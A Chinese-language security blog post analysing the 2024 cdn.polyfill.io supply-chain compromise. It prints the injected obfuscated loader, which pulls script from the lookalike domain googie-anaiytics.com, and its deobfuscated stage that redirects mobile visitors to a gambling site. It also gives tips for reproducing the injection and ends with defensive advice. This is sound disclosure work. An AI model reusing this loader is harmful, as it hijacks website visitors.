---
title: 請儘速遠離 cdn.polyfill.io 之惡意程式碼淺析
date: 2024-06-25 11:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/stop-using-polyfill-io/cover.png
---

Polyfill.io 是一個能夠自動提供前端 polyfill 的服務，使用方法相當方便，只需要選擇想被 polyfill 的功能，再引入一個 JavaScript 檔案即可：

``` html
<script src="https://polyfill.io/v3/polyfill.min.js"></script>
```

Server 端會自動根據 user-agent 來判斷是不是需要回傳 polyfill，所以只會引入真的需要的程式碼，聽起來方便又好用。

但這幾天應該有人收到 Google Ads 的通知，說這有 security issue，這又是爲什麼呢？

<!-- more -->

## Polyfill.io 的現況

如果要講得更精確一點的話，有一個叫做 [polyfill-service](https://github.com/polyfillpolyfill/polyfill-service) 的開源專案，可以做到我開頭講的事情，但現在很多人都懶得自己跑一個服務，因此可以偷懶直接引入他們提供的 CDN，就可以享有相同的功能。

但在今年 2 月底的時候，原本用來提供服務的網域 `cdn.polyfill.io` 被賣給了一間中國公司，而專案的開發者 @triblondon 也在推特上跳出來[呼籲](https://x.com/triblondon/status/1761852117579427975)大家拿掉對 CDN 的引用，並且說他從來都沒有那個 domain 的所有權：

![twitter 貼文](/img/stop-using-polyfill-io/p1.png)

也有人做了一個叫做 [Polykill](https://polykill.io/) 的網站，講述了事情的來龍去脈。與此同時，知名的 CDN 廠商 [Cloudflare](https://blog.cloudflare.com/polyfill-io-now-available-on-cdnjs-reduce-your-supply-chain-risk?utm_campaign=cf_blog&utm_content=20240229&utm_medium=organic_social&utm_source=twitter) 與 [Fastly](https://community.fastly.com/t/new-options-for-polyfill-io-users/2540) 都提供了他們自己的 fork，讓使用者有相對來說能夠更安心的選擇。

那如果沒有選這些，繼續用 `cdn.polyfill.io` 的話會怎樣呢？

## 惡意程式碼淺析

答案是：「在某些狀況下，網站的使用者會拿到一個被加料的 JavaScript」。

這是現在進行式，我今天才剛重現出來。

在 GitHub 上有一個 issue：[polyfill.io domain owner #2873](https://github.com/polyfillpolyfill/polyfill-service/issues/2873) 在討論這件事，在留言處有網友 @alitonium 提供了可以重現的步驟，包括：

1. 受影響的網址
2. 有效的 user-agent
3. 要帶 Referer

在滿足了一些條件之後，就能夠看到被加料的回應。

我今天稍微試了一下，這是一般的回應，就是回傳正常的 polyfill 而已：

![正常的 response](/img/stop-using-polyfill-io/p2.png)

而底下是有被加料的：

![有毒的 response](/img/stop-using-polyfill-io/p3.png)

很明顯可以看出後面多了一段程式碼。

如果想自己試試看的話，我的 user-agent 帶的是：

```
Mozilla/7.48 (iPhone15,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1
```

前面那個 `Mozilla/7.48` 的數字可以亂改，然後因為 GitHub 上的評論說一個 IP 似乎只會中一次，所以我嘗試用 `X-Forwared-For` 偽造 IP，發現似乎有效，算是一種以毒攻毒嗎？

總之呢，IP 多換幾次，user-agent 也多換幾次之後應該就能試出來。

那後面加料的那段程式碼會做什麼？內容如下：

``` js
function MqMqY(e) {
  var t = "",
    n = (r = c1 = c2 = 0);
  while (n < e.length) {
    r = e.charCodeAt(n);
    if (r < 128) {
      t += String.fromCharCode(r);
      n++;
    } else if (r > 191 && r < 224) {
      c2 = e.charCodeAt(n + 1);
      t += String.fromCharCode(((r & 31) << 6) | (c2 & 63));
      n += 2;
    } else {
      c2 = e.charCodeAt(n + 1);
      c3 = e.charCodeAt(n + 2);
      t += String.fromCharCode(((r & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
      n += 3;
    }
  }
  return t;
}
function HHwbhL(e) {
  var m = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  var t = "",
    n,
    r,
    i,
    s,
    o,
    u,
    a,
    f = 0;
  e = e.replace(/[^A-Za-z0-9+/=]/g, "");
  while (f < e.length) {
    s = m.indexOf(e.charAt(f++));
    o = m.indexOf(e.charAt(f++));
    u = m.indexOf(e.charAt(f++));
    a = m.indexOf(e.charAt(f++));
    n = (s << 2) | (o >> 4);
    r = ((o & 15) << 4) | (u >> 2);
    i = ((u & 3) << 6) | a;
    t = t + String.fromCharCode(n);
    if (u != 64) {
      t = t + String.fromCharCode(r);
    }
    if (a != 64) {
      t = t + String.fromCharCode(i);
    }
  }
  return MqMqY(t);
}
eval("window")["klodTq"] = function () {
  (function (u, r, w, d, f, c) {
    var x = HHwbhL;
    u = decodeURIComponent(x(u.replace(new RegExp(c + "" + c, "g"), c)));
    ("jQuery");
    k = r[2] + "c" + f[1];
    ("Flex");
    v = k + f[6];
    var s = d.createElement(v + c[0] + c[1]),
      g = function () {};
    s.type = "text/javascript";
    {
      s.onload = function () {
        g();
      };
    }
    s.src = u;
    ("CSS");
    d.getElementsByTagName("head")[0].appendChild(s);
  })(
    "aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=",
    "gUssQxWzjLAD",
    window,
    document,
    "DrPdgDiahyku",
    "ptsrhUDHCv"
  );
};
if (
  !/^Mac|Win/.test(navigator.platform) &&
  document.referrer.indexOf(".") !== -1
)
  klodTq();
```

把上面直接丟到 ChatGPT 要他幫你轉成可讀性佳的程式碼，就會得到底下的結果：

``` js
// Function to decode a UTF-8 string
function decodeUtf8(input) {
  let output = "";
  let i = 0, r, c1, c2, c3;

  while (i < input.length) {
    r = input.charCodeAt(i);

    if (r < 128) {
      output += String.fromCharCode(r);
      i++;
    } else if (r > 191 && r < 224) {
      c2 = input.charCodeAt(i + 1);
      output += String.fromCharCode(((r & 31) << 6) | (c2 & 63));
      i += 2;
    } else {
      c2 = input.charCodeAt(i + 1);
      c3 = input.charCodeAt(i + 2);
      output += String.fromCharCode(((r & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
      i += 3;
    }
  }
  return output;
}

// Function to decode a Base64 string
function decodeBase64(input) {
  const base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  let output = "";
  let i = 0, n, r, s, o, u, a;

  input = input.replace(/[^A-Za-z0-9+/=]/g, "");

  while (i < input.length) {
    s = base64Chars.indexOf(input.charAt(i++));
    o = base64Chars.indexOf(input.charAt(i++));
    u = base64Chars.indexOf(input.charAt(i++));
    a = base64Chars.indexOf(input.charAt(i++));
    n = (s << 2) | (o >> 4);
    r = ((o & 15) << 4) | (u >> 2);
    let iChar = ((u & 3) << 6) | a;

    output += String.fromCharCode(n);
    if (u != 64) {
      output += String.fromCharCode(r);
    }
    if (a != 64) {
      output += String.fromCharCode(iChar);
    }
  }

  return decodeUtf8(output);
}

// Function to load a JavaScript file dynamically
function loadScript() {
  (function (encodedUrl, randomString, window, document, randomString2, separator) {
    const decode = decodeBase64;
    const decodedUrl = decodeURIComponent(decode(encodedUrl.replace(new RegExp(separator + separator, "g"), separator)));
    const scriptId = randomString[2] + "c" + randomString2[1] + randomString2[6];
    const scriptElement = document.createElement(scriptId + separator[0] + separator[1]);
    const noop = function () {};

    scriptElement.type = "text/javascript";
    scriptElement.onload = noop;
    scriptElement.src = decodedUrl;
    document.getElementsByTagName("head")[0].appendChild(scriptElement);
  })(
    "aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=",
    "gUssQxWzjLAD",
    window,
    document,
    "DrPdgDiahyku",
    "ptsrhUDHCv"
  );
}

// Automatically execute the script loading function if the platform is not Mac or Win and the referrer is valid
if (!/^Mac|Win/.test(navigator.platform) && document.referrer.indexOf(".") !== -1) {
  loadScript();
}
```

在 Mac 跟 Windows 上，而且有帶 referrer 的網頁才會觸發，會去載入一個 script，而 script 的 src 是 `aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=` base64 解碼之後的結果：

```
https://www.googie-anaiytics.com/gtags.js
```

乍看之下會想說：「這不就是 Google Analytics 嗎？有什麼特別？」，但更仔細看，會看到 `googie` 跟 `anaiytics` 這些偽裝的單字，顯然是個惡意 domain。

而這個檔案裡的程式碼理所當然經過了混淆：

![惡意 JavaScript 內容](/img/stop-using-polyfill-io/p4.png)

但因為不太用心，是找現成工具做的，所以我們可以用其他現成工具來還原：

1. https://obf-io.deobfuscate.io/
2. https://deobfuscate.relative.im/

可以還原成底下可讀性好了不少的形式，至少有些字串可以看：

``` js
function loadJS(_0x1fa6fb, _0x1802b4) {
  var _0x70d7c = document.createElement('script'),
    _0x505482 = _0x1802b4 || function () {}
  _0x70d7c.type = 'text/javascript'
  {
    _0x70d7c.onload = function () {
      _0x505482()
    }
  }
  _0x70d7c.src = _0x1fa6fb
  document.getElementsByTagName('head')[0].appendChild(_0x70d7c)
}
function isPc() {
  try {
    var _0x4ed75f =
        navigator.platform == 'Win32' || navigator.platform == 'Windows',
      _0x3f80bf =
        navigator.platform == 'Mac68K' ||
        navigator.platform == 'MacPPC' ||
        navigator.platform == 'Macintosh' ||
        navigator.platform == 'MacIntel'
    if (_0x3f80bf || _0x4ed75f) {
      return true
    } else {
      return false
    }
  } catch (_0x1793fe) {
    return false
  }
}
function checkKeywords(_0x3ab08e) {
  const _0x18dd4d = document.documentElement.innerHTML
  let _0x3cdba9 = false
  for (const _0xda2c7 of _0x3ab08e) {
    if (_0x18dd4d.indexOf(_0xda2c7) !== -1) {
      _0x3cdba9 = true
      const _0xd85bed = _0x18dd4d.indexOf(_0xda2c7),
        _0x267743 = _0x18dd4d.substring(_0xd85bed - 20, _0xd85bed + 20)
      break
    }
  }
  return _0x3cdba9
}
function vfed_update(_0x2723e2) {
  fetch('https://www.googie-anaiytics.com/keywords/vn-keyword.json')
    .then((_0x1204ac) => _0x1204ac.json())
    .then((_0x318df9) => {
      const _0x3d6056 = checkKeywords(_0x318df9)
      _0x3d6056 &&
        _0x2723e2 !== '' &&
          loadJS(
            'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn',
            function () {
              if (usercache == true) {
                window.location.href = _0x2723e2
              }
            }
          )
    })
    .catch((_0x2c91ce) =>
      console.error('Error fetching the JSON file:', _0x2c91ce)
    )
}
function check_tiaozhuan() {
  const _0x464cf7 = (function () {
      let _0x2ddab7 = true
      return function (_0x15452, _0x3e7ea8) {
        const _0x2faa6e = {
          bjeMJ: function (_0x15a8ac, _0xefecf2) {
            return _0x15a8ac(_0xefecf2)
          },
          pqiqW: function (_0x50e73a, _0x158536) {
            return _0x50e73a !== _0x158536
          },
          zbtQp: function (_0x1dfdda, _0x1aa046, _0x3b4d3c) {
            return _0x1dfdda(_0x1aa046, _0x3b4d3c)
          },
          volhE:
            'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn',
          OBmcC: function (_0x598542, _0x5a0037) {
            return _0x598542 == _0x5a0037
          },
          IzGuE: function (_0x193bad, _0x38f83f) {
            return _0x193bad <= _0x38f83f
          },
          MctlV: function (_0x4cf969, _0x3f5292) {
            return _0x4cf969 === _0x3f5292
          },
          NiqyK: 'mcNrr',
          HANcJ: 'QRUUg',
          pgwSI: function (_0x26a5c9, _0x345245) {
            return _0x26a5c9 !== _0x345245
          },
          XaDFm: 'iuHAU',
        }
        const _0x1c444b = _0x2ddab7
          ? function () {
              if (_0x2faa6e.MctlV(_0x2faa6e.NiqyK, _0x2faa6e.HANcJ)) {
                const _0x180d73 = _0x2faa6e.bjeMJ(_0x3eaf18, _0x2bb07f)
                _0x180d73 &&
                  _0x2faa6e.pqiqW(_0x4742d9, '') &&
                    _0x2faa6e.zbtQp(_0x955e25, _0x2faa6e.volhE, function () {
                      _0x2faa6e.OBmcC(_0x4eb5f8, true) &&
                        (_0x94c0a4.location.href = _0x1dbf3a)
                    })
              } else {
                if (_0x3e7ea8) {
                  if (_0x2faa6e.pgwSI(_0x2faa6e.XaDFm, _0x2faa6e.XaDFm)) {
                    _0x2faa6e.IzGuE(_0x51047d, 10) && (_0x391f84 = _0x40837e)
                  } else {
                    const _0x47d725 = _0x3e7ea8.apply(_0x15452, arguments)
                    return (_0x3e7ea8 = null), _0x47d725
                  }
                }
              }
            }
          : function () {}
        return (_0x2ddab7 = false), _0x1c444b
      }
    })(),
    _0x41d32e = _0x464cf7(this, function () {
      return _0x41d32e
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x41d32e)
        .search('(((.+)+)+)+$')
    })
  _0x41d32e()
  var _0x112e13 = navigator.userAgent.match(
    /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
  )
  if (_0x112e13) {
    var _0x152838 = window.location.host,
      _0xc3b985 = document.referrer,
      _0x56bd89 = '',
      _0x42c985 = 'https://wweeza.com/redirect?from=bitget',
      _0x57dc62 = Math.floor(Math.random() * 100 + 1),
      _0x5462a8 = new Date(),
      _0x394b64 = _0x5462a8.getHours()
    if (
      _0x152838.indexOf('www.dxtv1.com') !== -1 ||
      _0x152838.indexOf('www.ys752.com') !== -1
    ) {
      _0x56bd89 = 'https://wweeza.com/redirect?from=bitget'
    } else {
      if (_0x152838.indexOf('shuanshu.com.com') !== -1) {
        _0x56bd89 = 'https://wweeza.com/redirect?from=bitget'
      } else {
        if (
          _0xc3b985.indexOf('.') !== -1 &&
          _0xc3b985.indexOf(_0x152838) == -1
        ) {
          _0x56bd89 = 'https://wweeza.com/redirect?from=bitget'
        } else {
          if (_0x394b64 >= 0 && _0x394b64 < 2) {
            _0x57dc62 <= 10 && (_0x56bd89 = _0x42c985)
          } else {
            if (_0x394b64 >= 2 && _0x394b64 < 4) {
              _0x57dc62 <= 15 && (_0x56bd89 = _0x42c985)
            } else {
              if (_0x394b64 >= 4 && _0x394b64 < 7) {
                _0x57dc62 <= 20 && (_0x56bd89 = _0x42c985)
              } else {
                if (_0x394b64 >= 7 && _0x394b64 < 8) {
                  if (_0x57dc62 <= 10) {
                    _0x56bd89 = _0x42c985
                  }
                } else {
                  _0x57dc62 <= 10 && (_0x56bd89 = _0x42c985)
                }
              }
            }
          }
        }
      }
    }
    _0x56bd89 != '' &&
      !isPc() &&
      document.cookie.indexOf('admin_id') == -1 &&
        document.cookie.indexOf('adminlevels') == -1 &&
        vfed_update(_0x56bd89)
  }
}
let tsastr = document.documentElement.outerHTML,
  bdtjfg = tsastr.indexOf('hm.baidu.com') != -1,
  cnzfg = tsastr.indexOf('.cnzz.com') != -1,
  wolafg = tsastr.indexOf('.51.la') != -1
let mattoo = tsastr.indexOf('.matomo.org') != -1,
  aanaly = tsastr.indexOf('.google-analytics.com') != -1,
  ggmana = tsastr.indexOf('.googletagmanager.com') != -1,
  aplausix = tsastr.indexOf('.plausible.io') != -1
let statcct = tsastr.indexOf('.statcounter.com') != -1
bdtjfg || cnzfg || wolafg || mattoo || aanaly || ggmana || aplausix || statcct
  ? setTimeout(check_tiaozhuan, 2000)
  : check_tiaozhuan()

```

這時候就要再次交給 ChatGPT 大神，不需要什麼高深的 prompt，只要跟他說把它可讀性變好就行，就可以得到底下的結果：

``` js
// Function to load a JavaScript file dynamically and execute a callback once it's loaded
function loadJS(url, callback) {
  const script = document.createElement('script');
  const onLoadCallback = callback || function () {};
  script.type = 'text/javascript';
  script.onload = onLoadCallback;
  script.src = url;
  document.getElementsByTagName('head')[0].appendChild(script);
}

// Function to determine if the current device is a PC
function isPc() {
  try {
    const isWindows = navigator.platform === 'Win32' || navigator.platform === 'Windows';
    const isMac = ['Mac68K', 'MacPPC', 'Macintosh', 'MacIntel'].includes(navigator.platform);
    return isWindows || isMac;
  } catch (error) {
    return false;
  }
}

// Function to check if any of the provided keywords exist in the document's HTML
function checkKeywords(keywords) {
  const htmlContent = document.documentElement.innerHTML;
  for (const keyword of keywords) {
    if (htmlContent.includes(keyword)) {
      return true;
    }
  }
  return false;
}

// Function to fetch keyword data and update the page if keywords match
function vfed_update(redirectUrl) {
  fetch('https://www.googie-anaiytics.com/keywords/vn-keyword.json')
    .then(response => response.json())
    .then(keywords => {
      const keywordsFound = checkKeywords(keywords);
      if (keywordsFound && redirectUrl) {
        loadJS('https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn', function () {
          if (window.usercache === true) {
            window.location.href = redirectUrl;
          }
        });
      }
    })
    .catch(error => console.error('Error fetching the JSON file:', error));
}

// Function to handle page redirection based on certain conditions
function check_tiaozhuan() {
  if (navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)) {
    const host = window.location.host;
    const referrer = document.referrer;
    const redirectBaseUrl = 'https://wweeza.com/redirect?from=bitget';
    const currentHour = new Date().getHours();
    let redirectUrl = '';

    if (['www.dxtv1.com', 'www.ys752.com', 'shuanshu.com.com'].includes(host) ||
        (referrer.includes('.') && !referrer.includes(host))) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 0 && currentHour < 2 && Math.random() * 100 + 1 <= 10) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 2 && currentHour < 4 && Math.random() * 100 + 1 <= 15) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 4 && currentHour < 7 && Math.random() * 100 + 1 <= 20) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 7 && currentHour < 8 && Math.random() * 100 + 1 <= 10) {
      redirectUrl = redirectBaseUrl;
    } else if (currentHour >= 8 && Math.random() * 100 + 1 <= 10) {
      redirectUrl = redirectBaseUrl;
    }

    if (redirectUrl && !isPc() && !document.cookie.includes('admin_id') && !document.cookie.includes('adminlevels')) {
      vfed_update(redirectUrl);
    }
  }
}

// Check for certain analytics tools in the document and trigger redirection logic accordingly
const htmlContent = document.documentElement.outerHTML;
const analyticsTools = ['hm.baidu.com', '.cnzz.com', '.51.la', '.matomo.org', '.google-analytics.com', '.googletagmanager.com', '.plausible.io', '.statcounter.com'];
const analyticsFound = analyticsTools.some(tool => htmlContent.includes(tool));

if (analyticsFound) {
  setTimeout(check_tiaozhuan, 2000);
} else {
  check_tiaozhuan();
}
```

函式名稱叫做 check_tiaozhuan（檢查跳轉），直接用中文變數名稱不演了。

總之呢，做了許多檢查之後，最後會把你導到一個越南的網站，看起來是運動賽事賭博的那種。

因此呢，如果你的網站上有引入到 `cdn.polyfill.io` 的程式碼，請立刻拿掉，否則有些使用者就會莫名其妙地被導到其他網站去。而且，我也不能保證反混淆跟 ChatGPT 還原出來的結果一定正確，都已經可以執行 JavaScript 做供應鏈攻擊了，它能做的事情其實更多，如果有人跟我說他還有偷拿 cookie 或是 localStorage 什麼的，這我也會相信（但目前的程式碼沒看到）。

## 未來該如何防禦？

先聲明一下，之所以會有資安問題，並不是 polyfill service 本身的錯，它是無辜的，如果你想繼續用的話，可以自己架一個，這完全沒有問題。問題是出在「引入了惡意網域 cdn.polyfill.io 的 JavaScript」這件事情上面。

引入第三方套件本來就會造成一些資安上的風險，更別提是像這種直接往 CDN 拿的，風險就更高了。

最好的防禦就是：不要用。

不管是來路不明的 `cdn.polyfill.io` 還是老牌的 cdnjs，全部都不要用，因為用了就是有風險。就算連 cdnjs 都有風險，詳情可參考：[從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦](https://blog.huli.tw/2021/08/22/cdnjs-and-supply-chain-attack/)。

如果真的一定要用，記得加上 `integrity` 屬性，它能保證 response 如果被篡改了，就不會被載入，多了一層防禦。

但像是 `cdn.polyfill.io` 這種原本就是動態內容的就沒辦法了，因為 `integrity` 只能針對固定的內容。

所以如果可以的話，盡量不要用這些第三方的套件。

話說有不少人用的 Disqus 其實也幹過這種事，詳情可以參考：[Disqus is Evil Trash 🗑](https://www.keeganleary.com/disqus-is-evil-trash/)

